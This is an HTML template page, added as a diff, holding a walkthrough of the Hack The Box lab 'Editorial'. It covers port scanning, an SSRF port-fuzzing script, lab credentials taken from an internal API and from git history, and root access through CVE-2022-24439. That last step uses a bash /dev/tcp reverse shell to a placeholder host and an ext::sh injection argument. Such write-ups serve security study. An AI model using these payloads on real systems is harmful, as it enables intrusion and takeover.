@@ -1,0 +1,222 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Editorial</title>
+    <link rel="stylesheet" href="{% static 'EthHack/css/machines/machines.css' %}">
+</head>
+<body>
+    <h1 class="title">HTB Editorail</h1>
+    <h2 class="subtitle">Enumeration</h2>
+
+    <div class="code-box"><pre><code>sudo nmap -p- -sCV IP --min-rate=2000 > nmap.txt</code></pre></div>
+    <p class="text">Port 22 and 80 are open. This is the common case. Let's start with HTTP.</p>
+
+    <div class="img">
+        <img src="{% static 'EthHack/images/editorial/1-page.png' %}" alt="">
+        <p class="text">On the default page, there is no interesting information, but on the page 'publish with us', there are many input boxes. It's juicey page.</p>
+    </div>
+    <div class="img">
+        <img src="{% static 'EthHack/images/editorial/2-request.png' %}" alt="">\
+        <p class="text">At first, try URL function that fetch url with other page. This box sends request to arbitrary page, so we can send to any http even localhost or our own local machine.</p>
+    </div>
+
+    <div class="img">
+        <img src="{% static 'EthHack/images/editorial/3-nc.png' %}" alt="">
+        <p class="text">On the local machine, establish open port with "nc", and forgery request from target website. As response, we can see the connection. <br><br>
+        This page looks vulnerabile with <u>SSRF(server side request forgery)</u>.</p>
+    </div>
+
+    <h2 class="subtitle">Foothold</h2>
+
+    <div class="img">
+        <img src="{% static 'EthHack/images/editorial/4-burp1.png' %}" alt="">
+        <p class="text">Take a look at the request send from target server using burpsuite, we can see "jpeg" file on the response. This response may change when we send request to other port. <br><br>
+        To explore open port on target machine, we use this response.</p>
+    </div>
+
+    <div class="img">
+        <img src="{% static 'EthHack/images/editorial/5-localhost.png' %}" alt="">
+        <p class="text">We set the variable 'bookurl' with '127.0.0.1:80', which is common port. Like response to our request we sent before, it include jpeg file in response. <br><br>
+        Other valid open ports may respond in other way. Let's observe response to the request to common http ports. </p>
+    </div>
+
+    <p class="text">I wrote a code which send requests to common http ports, and show us whether it includes jpeg file in response.</p>
+    <div class="code-box"><pre><code>import requests
+
+common_http_ports = [
+    80,     # HTTP
+    443,    # HTTPS
+    8080,   # Common HTTP proxy / dev server
+    8000,   # Dev servers (Python, Ruby, Node.js, etc.)
+    8443,   # HTTPS alternate
+    8888,   # Jupyter, other dev tools
+    5000,   # Flask, dev APIs
+    3000,   # React, Node, dev frontend
+    8081,   # HTTP alternate
+    7000,   # Internal dashboards
+    9090,   # Prometheus, web UIs
+    8181,   # Admin panels
+    10000,  # Webmin, NAS, router UIs
+    49152,  # Dynamic port (common for Docker/containers)
+    5601,   # Kibana
+    9200,   # Elasticsearch
+    5985,   # WinRM HTTP
+    5986    # WinRM HTTPS
+]
+
+url = "http://editorial.htb/upload-cover"
+
+files = {
+    "bookfile": ("", b"", "application/octet-stream")
+}
+headers = {
+    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
+    "Referer": "http://editorial.htb/upload"
+}
+
+for i in common_http_ports:
+    bookurl = f"http://127.0.0.1:{i}"
+    data = {
+        "bookurl" : bookurl
+    }
+    response = requests.post(url, data=data, files=files, headers=headers)
+    print("-------------------------------------------")
+    print(i)
+    print("Status:", response.status_code)
+    print("Response:", response.text[:300])</code></pre></div>
+    <div class="img">
+        <img src="{% static 'EthHack/images/editorial/6-common-http.png' %}" alt="">
+        <p class="text">As you can see, there is no new information. All responses include a jgep file. We may need to check other ports which is not for HTTP and common in HTB. <br><br>
+        Also, make it doubly sure to work this request fuzzer, we fetch empty bookfile to the request.</p>
+    </div>
+
+    <div class="code-box">
+        <pre><code>import requests
+
+htb_common_ports = [
+    21, 22, 25, 53, 69, 80, 111, 139, 1433, 2049, 3306, 3389,
+    443, 445, 5000, 5432, 5985, 5986, 6379, 8080, 8443,
+    8888, 27017, 389, 631, 873, 8000, 3000
+]
+
+
+with open("empty.jpg", 'wb') as f:
+    f.write(b'')
+
+for i in htb_common_ports:
+    try:
+        with open("empty.jpg", 'rb') as f:
+            payload = {
+                "bookurl": f"http://127.0.0.1:{i}"
+            }
+            files = {
+                "bookfile": f
+            }
+
+            response = requests.post("http://editorial.htb/upload-cover",
+                                     data=payload, files=files, timeout=3)
+            print(f"Sent payload to port number.{i}")
+
+            if not response.text.strip().endswith('.jpeg'):
+                print(f"[+] Port {i} returned different content:")
+                print(response.text[:200])
+
+    except requests.RequestException as err:
+        print(f"[-] Error on port {i}: {err}")
+</code></pre>
+    </div>
+
+    <div class="img">
+        <img src="{% static 'EthHack/images/editorial/7-found.png' %}" alt="">
+        <p class="text">Our request fuzzer return different output with prot:5000. <br><br>
+        Let's request the port 5000 with <u>http://127.0.0.1:5000</u>.</p>
+    </div>
+
+    <div class="img">
+        <img src="{% static 'EthHack/images/editorial/8-get-json.png' %}" alt="">
+        <p class="text">When we right click the img and press open with new page, randomly named json file downloaded.</p>
+    </div>
+
+
+    <div class="img">
+        <img src="{% static 'EthHack/images/editorial/9-json-content.png' %}" alt="">
+        <p class="text">This json file contains messages, which include url. Port 5000 may be the message application for coworkers. And this file reveals the path to the message.</p>
+    </div>
+
+    <div class="img">
+        <img src="{% static 'EthHack/images/editorial/10-str.png' %}" alt="">
+        <p class="text">There are 6 message paths, the first two messages cannot be rendered via publish with us page, so skip to the third path <u>authors</u>.</p>
+    </div>
+
+    <div class="img">
+        <img src="{% static 'EthHack/images/editorial/11-credentials.png' %}" alt="">
+        <p class="text">As before, send request via SSRF, we installed the json file <u>authors</u> with url <u>http://127.0.0.1:5000/api/latest/metadata/message/authors</u>.</p>
+    </div>
+
+    <p class="text">We got credentials <u>username : dev</u> and <u>password : dev080217_devAPI!@</u>. Let's establish ssh conneciton.</p>
+
+    <div class="code-box">
+        <pre><code>ssh dev@TARGET_IP</code></pre>
+    </div>
+    <p class="text">And we can cat user.txt</p>
+
+    <h2 class="subtitle">Lateral Movement</h2>
+
+    <div class="img">
+        <img src="{% static 'EthHack/images/editorial/13-list-la.png' %}" alt="">
+        <p class="text">In the ~/apps directory, there is hidden directory <u>.git</u>. We could see edit history of git files.</p>
+    </div>
+
+    <div class="img">
+        <img src="{% static 'EthHack/images/editorial/14-git-status.png' %}" alt="">
+        <p class="text"><strong>git status</strong> : Shows the current state of your Git working directory and staging area. <br> <br>
+        <strong>branch master</strong> : The main line of development in a project.</p>
+    </div>
+
+    <div class="img">
+        <img src="{% static 'EthHack/images/editorial/15-git-log.png' %}" alt="">
+        <p class="text"><strong>git log</strong> : It shows you a history of commits in the Git repository. <br><br>
+        And there is interesting information. There is a line "change(api) : downgrading prod to dev". This log history might include credentials of prod.</p>
+    </div>
+
+    <div class="img">
+        <img src="{% static 'EthHack/images/editorial/16-git-show.png' %}" alt="">
+        <p class="text">As expected, there is a credentials. <br><br>
+        <u>username : prod </u>and <u>password : 080217_Producti0n_2023!@</u>. <br><br>
+        We can change user to prod with "su" command.</p>
+    </div>
+
+    <div class="code-box"><pre><code>su prod</code></pre></div>
+    <img src="{% static 'EthHack/images/editorial/17-prod.png' %}" alt="" id="big">
+
+    <h2 class="subtitle">Privilege Escalation</h2>
+
+    <div class="img">
+        <img src="{% static 'EthHack/images/editorial/18-sudo-l.png' %}" alt="" id="big">
+    </div>
+    <p class="text">This user prod has privilege, though user dev didn't have any privilege.</p>
+
+
+    <div class="img">
+        <img src="{% static 'EthHack/images/editorial/19-git-code.png' %}" alt="">
+        <p class="text">Glance at the privileged python code, it uses Repo library of git. <br><br>
+            Searching on google, there is CVE related to git repo <u>Git Repo CVE-2022-24439</u>. <br><br>
+            We are probably able to gain root privilege with this vulberability.
+        </p>
+    </div>
+    <p class="text">I wrote explanation about this CVE on <a href="{% url 'git-repo-cve-2022-24439' %}">THIS PAGE</a>. Please visit there if you are interested.</p>
+
+    <p class="text">Create reverse shell file to make git repo executing on the remote machine.</p>
+    <div class="code-box">
+        <pre><code>echo "bash -i >& /dev/tcp/YOUR_IP/4444 0>&1" > /tmp/shell.sh</code></pre>
+    </div>
+    <div class="code-box"><pre><code>nc -lvnp 4444      #on the local machine</code></pre></div>
+    <div class="code-box">
+        <pre><code>sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py 'ext::sh -c bash% /tmp/shell.sh'</code></pre>
+    </div>
+    <img src="{% static 'EthHack/images/editorial/20-root.png' %}" alt="" id="big">
+</body>
+</html>
